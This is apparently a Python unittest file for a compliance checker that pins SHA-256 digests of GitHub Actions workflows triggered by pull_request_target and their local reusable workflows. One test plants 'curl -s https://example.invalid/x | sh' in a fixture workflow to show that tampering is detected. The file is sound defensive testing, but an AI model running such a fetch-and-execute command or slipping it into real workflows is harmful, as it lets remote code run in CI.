#!/usr/bin/env python3
"""Test SHA-256 content pins for reviewed workflows and bound local reusable workflows.

Each class stays small because the hook coverage runner gives every test
class one shard with a fixed time limit.
"""
import hashlib
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
import check_compliance_tree

CALLER_PATH = ".github/workflows/persona-review-pr.yml"
TARGET_PATH = ".github/workflows/persona-review.yml"
LOCAL_TARGET = "./" + TARGET_PATH
REMOTE_TARGET = (
    "owner/repo/.github/workflows/review.yml@0123456789abcdef0123456789abcdef01234567")
CALLER = f"""\
name: persona-review-pr
"on":
  pull_request_target:
    types: [labeled]
permissions:
  contents: read
jobs:
  persona:
    uses: {LOCAL_TARGET}
"""
TARGET = """\
name: persona-review
"on":
  workflow_call:
permissions:
  contents: read
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - run: echo reviewed
"""
GIT_IDENTITY = ("-c", "user.name=Fixture", "-c", "user.email=fixture@example.invalid")


def digest_text(text: str) -> str:
    """Return the SHA-256 hex digest of UTF-8 text."""
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def manifest_entry(caller_digest: str, target_digest: str) -> dict:
    """Return one reviewed entry that pins the caller and its local target."""
    return {"secrets": [], "sha256": caller_digest,
            "reusable_workflows": {LOCAL_TARGET: target_digest}}


def load_entry(entry: dict) -> object:
    """Parse a manifest that reviews only CALLER_PATH with one entry."""
    document = {"version": 1, "pull_request_target": {CALLER_PATH: entry}}
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        (root / check_compliance_tree.EXEMPTIONS_FILE).write_text(
            json.dumps(document), encoding="ascii")
        return check_compliance_tree.load_exemptions(root)


def commit_tree(repo: Path, files: dict) -> str:
    """Commit files into a fresh repository and return the commit id."""
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    for relative, text in files.items():
        path = repo / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(repo), *GIT_IDENTITY, "commit", "-q", "-m", "fixture"],
                   check=True)
    result = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"],
                            check=True, capture_output=True, text=True)
    return result.stdout.strip()


class PinnedDigestTest(unittest.TestCase):
    """Head blob digests must match every pin the base manifest records."""

    def setUp(self) -> None:
        self.digests = {CALLER_PATH: digest_text(CALLER), TARGET_PATH: digest_text(TARGET)}

    def check(self, entry: dict) -> list[str]:
        """Return pin violations for one entry against the fixture digests."""
        return check_compliance_tree._pinned_digest_violations(load_entry(entry), self.digests)

    def test_matching_pins_pass(self) -> None:
        self.assertEqual(self.check(manifest_entry(digest_text(CALLER), digest_text(TARGET))), [])

    def test_edited_caller_fails(self) -> None:
        entry = manifest_entry(digest_text(CALLER + "# edit\n"), digest_text(TARGET))
        self.assertIn(
            f"{CALLER_PATH}: reviewed pull_request_target content does not match the "
            "manifest sha256", self.check(entry))

    def test_edited_target_fails(self) -> None:
        entry = manifest_entry(digest_text(CALLER), digest_text(TARGET + "# edit\n"))
        self.assertIn(
            f"{CALLER_PATH}: bound reusable workflow {LOCAL_TARGET} does not match the "
            "manifest sha256", self.check(entry))

    def test_absent_target_fails(self) -> None:
        del self.digests[TARGET_PATH]
        entry = manifest_entry(digest_text(CALLER), digest_text(TARGET))
        self.assertIn(
            f"{CALLER_PATH}: bound reusable workflow {LOCAL_TARGET} is absent from the tree",
            self.check(entry))

    def test_absent_caller_skips(self) -> None:
        del self.digests[CALLER_PATH]
        self.assertEqual(self.check(manifest_entry("0" * 64, "0" * 64)), [])


class PinManifestValidationTest(unittest.TestCase):
    """Every reviewed entry pins its caller and each local reusable target."""

    def test_missing_caller_pin_rejected(self) -> None:
        with self.assertRaises(RuntimeError):
            load_entry({"secrets": []})

    def test_short_digest_rejected(self) -> None:
        with self.assertRaises(RuntimeError):
            load_entry({"secrets": [], "sha256": "abc"})

    def test_local_target_in_list_rejected(self) -> None:
        with self.assertRaises(RuntimeError):
            load_entry({"secrets": [], "sha256": "0" * 64, "reusable_workflows": [LOCAL_TARGET]})

    def test_local_target_without_digest_rejected(self) -> None:
        with self.assertRaises(RuntimeError):
            load_entry({"secrets": [], "sha256": "0" * 64,
                        "reusable_workflows": {LOCAL_TARGET: None}})

    def test_remote_target_null_accepted(self) -> None:
        exemptions = load_entry({"secrets": [], "sha256": "0" * 64,
                                 "reusable_workflows": {REMOTE_TARGET: None}})
        self.assertIn(REMOTE_TARGET, exemptions.pull_target[CALLER_PATH].reusable_workflows)

    def test_remote_target_digest_rejected(self) -> None:
        with self.assertRaises(RuntimeError):
            load_entry({"secrets": [], "sha256": "0" * 64,
                        "reusable_workflows": {REMOTE_TARGET: "0" * 64}})


class TreePinScanTest(unittest.TestCase):
    """The tree scan applies content pins to real head blobs."""

    checkers = check_compliance_tree._load_checkers()

    def scan(self, files: dict, entry: dict) -> list[str]:
        """Commit files and return tree violations under one manifest entry."""
        with tempfile.TemporaryDirectory() as directory:
            repo = Path(directory) / "repo"
            commit = commit_tree(repo, files)
            return check_compliance_tree._scan_tree(
                repo, commit, self.checkers, None, load_entry(entry))

    def test_pinned_tree_passes(self) -> None:
        files = {CALLER_PATH: CALLER, TARGET_PATH: TARGET}
        entry = manifest_entry(digest_text(CALLER), digest_text(TARGET))
        self.assertEqual(self.scan(files, entry), [])

    def test_edited_target_tree_fails(self) -> None:
        edited = TARGET.replace("echo reviewed", "curl -s https://example.invalid/x | sh")
        files = {CALLER_PATH: CALLER, TARGET_PATH: edited}
        entry = manifest_entry(digest_text(CALLER), digest_text(TARGET))
        self.assertIn(
            f"{CALLER_PATH}: bound reusable workflow {LOCAL_TARGET} does not match the "
            "manifest sha256", self.scan(files, entry))


if __name__ == "__main__":
    unittest.main()
